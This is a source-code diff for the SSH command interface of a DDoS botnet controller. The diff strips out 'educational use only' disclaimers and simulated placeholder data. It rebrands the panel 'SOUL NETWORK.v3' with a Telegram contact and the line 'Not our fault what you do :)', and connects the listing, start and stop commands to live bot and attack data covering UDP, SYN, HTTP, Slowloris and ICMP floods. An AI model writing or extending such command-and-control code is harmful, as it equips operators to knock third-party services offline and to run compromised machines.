@@ -1,5 +1,4 @@
 #include "ssh_service.h"
-#include "ascii_art.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,6 +9,7 @@
 #include <pthread.h>
 #include <time.h>
 #include <signal.h>
+#include <ctype.h>
 
 // Global users database
 user_t users[100];
@@ -87,18 +87,21 @@ int authenticate_user(const char* username, const char* password, user_t* user) 
 void ssh_send_banner(int client_socket) {
     char banner[1024];
     time_t now = time(NULL);
+    char time_str[26];
+    ctime_r(&now, time_str);
+    time_str[24] = '\0'; // Remove newline
     
     snprintf(banner, sizeof(banner),
         "\033[1;32m\n"
         "╔════════════════════════════════════════════════════════════════╗\n"
-        "║                  BOTNET C&C SSH SERVICE                        ║\n"
-        "║                     EDUCATIONAL USE ONLY                       ║\n"
-        "║                      YOUR SERVERS ONLY                         ║\n"
+        "║                         SOUL NETWORK.v3                        ║\n"
+        "║                    TeleG  https://t.me/yonqv168j               ║\n"
+        "║                      Not our fault what you do :)              ║\n"
         "║                                                                ║\n"
-        "║                    Welcome to the C&C                         ║\n"
-        "║                 Connection Time: %s                   ║\n"
+        "║                    Welcome to the Soul Network!                ║\n"
+        "║                        Connection Time: %s                     ║\n"
         "╚════════════════════════════════════════════════════════════════╝\n"
-        "\033[0m\n", ctime(&now));
+        "\033[0m\n", time_str);
     
     send(client_socket, banner, strlen(banner), 0);
 }
@@ -119,8 +122,6 @@ void ssh_help(client_session_t* session) {
             "  stop all                - Stop all attacks\n"
             "  methods                 - Show attack methods\n"
             "  system                  - Show system info\n"
-            "  adduser <user> <pass>   - Add new user\n"
-            "  deluser <user>          - Delete user\n"
             "  clear                   - Clear screen\n"
             "  exit                    - Logout\n"
             "\n\033[1;33mAttack Methods:\033[0m UDP-FLOOD, TCP-SYN, HTTP-FLOOD, SLOWLORIS, ICMP-FLOOD\n");
@@ -144,35 +145,92 @@ void ssh_help(client_session_t* session) {
     send(session->client_socket, help_msg, strlen(help_msg), 0);
 }
 
+// Real bot list display
 void ssh_list_bots(client_session_t* session) {
-    char response[1024];
-    // This would interface with the main C&C bot list
-    snprintf(response, sizeof(response),
+    (void)session; // Mark parameter as used
+    
+    // Get real bot data from main C&C
+    bot_t* bots = get_bots_list();
+    int bot_count = get_bot_count();
+    
+    char response[4096]; // Larger buffer for real data
+    char* ptr = response;
+    int remaining = sizeof(response);
+    
+    int len = snprintf(ptr, remaining,
         "\033[1;35mConnected Bots:\033[0m\n"
         "┌──────────┬─────────────────┬────────┬────────────────────┐\n"
         "│   ID     │      IP         │  Port  │    Last Seen       │\n"
-        "├──────────┼─────────────────┼────────┼────────────────────┤\n"
-        "│ BOT-001  │ 192.168.1.101   │ 1337   │ 2024-01-15 10:30:15│\n"
-        "│ BOT-002  │ 192.168.1.102   │ 1337   │ 2024-01-15 10:29:45│\n"
-        "│ BOT-003  │ 192.168.1.103   │ 1337   │ 2024-01-15 10:28:12│\n"
-        "└──────────┴─────────────────┴────────┴────────────────────┘\n"
-        "Total: 3 bots connected\n");
+        "├──────────┼─────────────────┼────────┼────────────────────┤\n");
+    ptr += len;
+    remaining -= len;
+    
+    int active_bots = 0;
+    for (int i = 0; i < bot_count && remaining > 0; i++) {
+        if (bots[i].active) {
+            char time_str[20];
+            strftime(time_str, sizeof(time_str), "%H:%M:%S %m-%d", localtime(&bots[i].last_seen));
+            
+            len = snprintf(ptr, remaining, "│ %-8s │ %-15s │ %-6d │ %-18s │\n", 
+                          bots[i].id, bots[i].ip, bots[i].port, time_str);
+            ptr += len;
+            remaining -= len;
+            active_bots++;
+        }
+    }
+    
+    if (remaining > 0) {
+        len = snprintf(ptr, remaining, 
+            "└──────────┴─────────────────┴────────┴────────────────────┘\n"
+            "Total: %d bots connected\n", active_bots);
+    }
     
     send(session->client_socket, response, strlen(response), 0);
 }
 
+// Real attack list display
 void ssh_list_attacks(client_session_t* session) {
-    char response[1024];
-    // This would interface with the main C&C attack list
-    snprintf(response, sizeof(response),
+    (void)session; // Mark parameter as used
+    
+    // Get real attack data from main C&C
+    attack_t* attacks = get_attacks_list();
+    int attack_count = get_attack_count();
+    
+    char response[4096];
+    char* ptr = response;
+    int remaining = sizeof(response);
+    
+    int len = snprintf(ptr, remaining,
         "\033[1;35mActive Attacks:\033[0m\n"
         "┌────┬────────────┬──────────────────┬──────┬────────┬─────────┐\n"
         "│ ID │   Method   │      Target      │ Port │  Time  │ Threads │\n"
-        "├────┼────────────┼──────────────────┼──────┼────────┼─────────┤\n"
-        "│  1 │ UDP-FLOOD  │ 192.168.1.50     │   80 │ 60s    │     100 │\n"
-        "│  2 │ TCP-SYN    │ example.com      │  443 │ 120s   │      50 │\n"
-        "└────┴────────────┴──────────────────┴──────┴────────┴─────────┘\n"
-        "Total: 2 active attacks\n");
+        "├────┼────────────┼──────────────────┼──────┼────────┼─────────┤\n");
+    ptr += len;
+    remaining -= len;
+    
+    int active_attacks = 0;
+    time_t current_time = time(NULL);
+    
+    for (int i = 0; i < attack_count && remaining > 0; i++) {
+        if (attacks[i].active) {
+            int elapsed = current_time - attacks[i].start_time;
+            int remaining_time = attacks[i].duration - elapsed;
+            if (remaining_time < 0) remaining_time = 0;
+            
+            len = snprintf(ptr, remaining, "│ %-2d │ %-10s │ %-16s │ %-4d │ %-6d │ %-7d │\n", 
+                          attacks[i].id, attacks[i].method, attacks[i].target, 
+                          attacks[i].port, remaining_time, attacks[i].threads);
+            ptr += len;
+            remaining -= len;
+            active_attacks++;
+        }
+    }
+    
+    if (remaining > 0) {
+        len = snprintf(ptr, remaining, 
+            "└────┴────────────┴──────────────────┴──────┴────────┴─────────┘\n"
+            "Total: %d active attacks\n", active_attacks);
+    }
     
     send(session->client_socket, response, strlen(response), 0);
 }
@@ -192,13 +250,13 @@ void ssh_start_attack(client_session_t* session, const char* command) {
     int port, duration, threads;
     
     if (sscanf(command, "attack %49s %255s %d %d %d", method, target, &port, &duration, &threads) == 5) {
+        // Start real attack through main C&C
+        start_real_attack(method, target, port, duration, threads);
+        
         snprintf(response, sizeof(response),
             "\033[1;32mAttack started successfully!\033[0m\n"
             "Method: %s | Target: %s:%d | Duration: %ds | Threads: %d\n",
             method, target, port, duration, threads);
-        
-        // Here you would interface with the main C&C to actually start the attack
-        // For now, we'll just simulate it
     } else {
         snprintf(response, sizeof(response),
             "\033[1;31mError: Invalid command format\033[0m\n"
@@ -208,25 +266,74 @@ void ssh_start_attack(client_session_t* session, const char* command) {
     send(session->client_socket, response, strlen(response), 0);
 }
 
+void ssh_stop_attack(client_session_t* session, const char* command) {
+    char response[512];
+    
+    if (session->user.privilege_level > 1) {
+        snprintf(response, sizeof(response), 
+            "\033[1;31mError: Insufficient privileges to stop attacks\033[0m\n");
+        send(session->client_socket, response, strlen(response), 0);
+        return;
+    }
+    
+    int attack_id;
+    if (sscanf(command, "stop %d", &attack_id) == 1) {
+        stop_real_attack(attack_id);
+        snprintf(response, sizeof(response), "\033[1;32mAttack #%d stopped\033[0m\n", attack_id);
+    } else if (strcmp(command, "stop all") == 0) {
+        stop_all_real_attacks();
+        snprintf(response, sizeof(response), "\033[1;32mAll attacks stopped\033[0m\n");
+    } else {
+        snprintf(response, sizeof(response), 
+            "\033[1;31mError: Invalid command\033[0m\n"
+            "Usage: stop <attack_id> or 'stop all'\n");
+    }
+    
+    send(session->client_socket, response, strlen(response), 0);
+}
+
 void ssh_system_info(client_session_t* session) {
     char info[1024];
     time_t now = time(NULL);
+    char time_str[26];
+    ctime_r(&now, time_str);
+    time_str[24] = '\0';
+    
+    // Get real data
+    int bot_count = get_bot_count();
+    int attack_count = get_attack_count();
+    int active_bots = 0;
+    int active_attacks = 0;
+    
+    bot_t* bots = get_bots_list();
+    attack_t* attacks = get_attacks_list();
+    
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].active) active_bots++;
+    }
+    for (int i = 0; i < attack_count; i++) {
+        if (attacks[i].active) active_attacks++;
+    }
     
     snprintf(info, sizeof(info),
         "\033[1;36mSystem Information:\033[0m\n"
         "┌────────────────────────────────┬─────────────────────────────┐\n"
-        "│ Service                        │ BotNet C&C SSH              │\n"
-        "│ Start Time                     │ %s"
-        "│ Connected Clients              │ 3                          │\n"
-        "│ Active Attacks                 │ 2                          │\n"
-        "│ Total Bots                     │ 15                         │\n"
-        "│ User Privilege                 │ %s                   │\n"
-        "│ SSH Port                       │ %d                         │\n"
-        "│ C&C Port                       │ 1337                       │\n"
+        "│ Service                        │ Soul-Net stuff              │\n"
+        "│ Start Time                     │ %s │\n"
+        "│ Connected Bots                 │ %-29d │\n"
+        "│ Active Attacks                 │ %-29d │\n"
+        "│ Total Bots                     │ %-29d │\n"
+        "│ User Privilege                 │ %-29s │\n"
+        "│ SSH Port                       │ %-29d │\n"
+        "│ C&C Port                       │ %-29d │\n"
         "└────────────────────────────────┴─────────────────────────────┘\n",
-        ctime(&now),
-        (session->user.privilege_level == 1) ? "Administrator     " : "User              ",
-        SSH_PORT);
+        time_str,
+        active_bots,
+        active_attacks,
+        bot_count,
+        (session->user.privilege_level == 1) ? "Administrator" : "User",
+        SSH_PORT,
+        1337);
     
     send(session->client_socket, info, strlen(info), 0);
 }
@@ -235,7 +342,7 @@ void ssh_command_loop(client_session_t* session) {
     char buffer[1024];
     char prompt[100];
     
-    snprintf(prompt, sizeof(prompt), "\033[1;32m%s@botnet-cnc\033[0m:\033[1;34m~$\033[0m ", 
+    snprintf(prompt, sizeof(prompt), "\033[1;32m%s@Soul-Net\033[0m:\033[1;34m~$\033[0m ", 
              session->user.username);
     
     while (session->authenticated) {
@@ -265,6 +372,12 @@ void ssh_command_loop(client_session_t* session) {
         }
         else if (strncmp(buffer, "attack ", 7) == 0) {
             ssh_start_attack(session, buffer);
+        }
+        else if (strncmp(buffer, "stop ", 5) == 0) {
+            ssh_stop_attack(session, buffer);
+        }
+        else if (strcmp(buffer, "stop all") == 0) {
+            ssh_stop_attack(session, buffer);
         }
         else if (strcmp(buffer, "system") == 0) {
             ssh_system_info(session);
